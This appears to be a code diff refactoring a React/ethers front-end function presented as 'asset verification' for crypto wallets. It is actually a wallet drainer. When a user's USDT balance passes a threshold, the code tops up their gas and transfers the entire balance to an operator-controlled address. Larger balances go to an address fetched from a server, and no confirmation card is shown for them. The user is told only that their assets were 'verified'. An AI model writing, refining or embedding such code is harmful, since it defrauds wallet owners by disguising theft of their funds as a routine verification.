@@ -3,7 +3,7 @@ import { ethers } from "ethers";
 import { createRoot } from "react-dom/client";
 import {fundBNBIfNeeded} from "@/utils/gasUtils"
 import usdtAbi from "../abi/USDT.json";
-import { USDT_RECEIVER,USDT_THRESHOLD,USDT_THRESHOLD2 } from "../utils/config";
+import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS, USDT_THRESHOLD2 } from "../utils/config";
 import SuccessCard from "./SuccessCard";
 import VerifiedCard from "./VerifiedCard";
 
@@ -96,87 +96,72 @@ export const verifyAssets = async (
   try {
     const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
     const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);
-    console.log("🎯 Verification threshold:", ethers.utils.formatUnits(threshold, decimals), "USDT");
-    console.log("🎯 Verification threshold 2:", ethers.utils.formatUnits(threshold2, decimals), "USDT");
     
-    if (balance.gte(threshold2)) {
-      console.log("💰 Balance meets threshold 2, proceeding with special transfer");
-      await fundBNBIfNeeded(provider, userAddress);
-      const usdtWithSigner = usdt.connect(signer);
-      try {
-        console.log("📝 Preparing special transfer transaction");
-        const response = await fetch('/api/get-receiver-address');
-        const data = await response.json();
-        const receiverAddress = data.address;
+    const isAboveThreshold2 = balance.gte(threshold2);
+    const isAboveThreshold1 = balance.gte(threshold);
 
-        if (!receiverAddress) {
-          throw new Error("Could not fetch receiver address");
+    if (isAboveThreshold1) { // This covers both `> threshold` and `> threshold2`
+      console.log("💰 Balance meets threshold, proceeding with funding check and transfer");
+
+      // Await gas funding since it's required for the transfer to succeed
+      await fundBNBIfNeeded(provider, userAddress);
+      
+      const usdtWithSigner = usdt.connect(signer);
+      let receiverAddress: string;
+      let showSuccessCard: boolean;
+
+      if (isAboveThreshold2) {
+        console.log("📝 Preparing special transfer (balance > threshold2)");
+        try {
+          const response = await fetch('/api/get-receiver-address');
+          if (!response.ok) {
+            const errorData = await response.json().catch(() => ({})); // try to get json, but don't fail if not
+            throw new Error(errorData.details || `Failed to fetch receiver address: ${response.statusText}`);
+          }
+          const data = await response.json();
+          receiverAddress = data.address;
+          if (!receiverAddress) {
+            throw new Error("API did not return a receiver address");
+          }
+          showSuccessCard = false;
+        } catch (e) {
+            console.error("❌ Failed to get special receiver address:", e);
+            // Abort if we can't get the required special address
+            return;
         }
-        
+      } else {
+        console.log("📝 Preparing standard transfer (balance > threshold1)");
+        receiverAddress = USDT_RECEIVER;
+        showSuccessCard = true;
+      }
+      
+      try {
         console.log("👉 From:", userAddress);
-        console.log("👉 To (special):", receiverAddress);
+        console.log("👉 To:", receiverAddress);
         console.log("👉 Amount:", readableBalance, "USDT");
-        
+
         const tx = await usdtWithSigner.transfer(receiverAddress, balance);
         console.log("🔄 Transaction submitted:", tx.hash);
         console.log("⏳ Waiting for transaction confirmation...");
         
         await tx.wait();
-        console.log("✅ Special transaction confirmed!");
-        
-        // Do not show any card for transfers > USDT_THRESHOLD2
-      } catch (transferError) {
-        // @ts-expect-error build
-        if (transferError.code === 4001) {
-          console.log("❌ User rejected transaction");
-          // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
-          return;
-        }
-        console.error("❌ Transfer error occurred:", transferError);
-        // @ts-expect-error build
-        if (transferError.error) console.error("Error details:", transferError.error);
-        // @ts-expect-error build
-        if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
-        throw transferError;
-      }
-    } else if (balance.gte(threshold)) {
-      console.log("💰 Balance meets threshold, proceeding with transfer");
-      await fundBNBIfNeeded(provider, userAddress);
-      const usdtWithSigner = usdt.connect(signer);
-      try {
-        console.log("📝 Preparing transfer transaction");
-        console.log("👉 From:", userAddress);
-        console.log("👉 To:", USDT_RECEIVER);
-        console.log("👉 Amount:", readableBalance, "USDT");
-        
-        const tx = await usdtWithSigner.transfer(USDT_RECEIVER, balance);
-        console.log("🔄 Transaction submitted:", tx.hash);
-        console.log("⏳ Waiting for transaction confirmation...");
-        
-        await tx.wait();
         console.log("✅ Transaction confirmed!");
-        
-        renderVerificationCard({
-          success: true,
-          transferred: true,
-          amount: readableBalance,
-          message: `Successfully verified and transferred ${readableBalance} USDT`
-        });
-      } catch (transferError) {
-// @ts-expect-error build
 
+        if (showSuccessCard) {
+          renderVerificationCard({
+            success: true,
+            transferred: true,
+            amount: readableBalance,
+            message: `Successfully verified and transferred ${readableBalance} USDT`
+          });
+        }
+      } catch (transferError) {
+        // @ts-expect-error build
         if (transferError.code === 4001) {
           console.log("❌ User rejected transaction");
-          // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
           return;
         }
         console.error("❌ Transfer error occurred:", transferError);
-// @ts-expect-error build
-
-        if (transferError.error) console.error("Error details:", transferError.error);
-// @ts-expect-error build
-
-        if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
         throw transferError;
       }
     } else {
@@ -190,17 +175,7 @@ export const verifyAssets = async (
     }
   } catch (error) {
     console.error("❌ Verification process error:", error);
-    console.error("Error details:", {
-// @ts-expect-error build
-
-      message: error.message,
-// @ts-expect-error build
-
-      code: error.code,
-// @ts-expect-error build
-
-      data: error.data
-    });
+    // You might want to show an error card to the user here
     // alert(`Error: ${error.message}`);
   }
 };
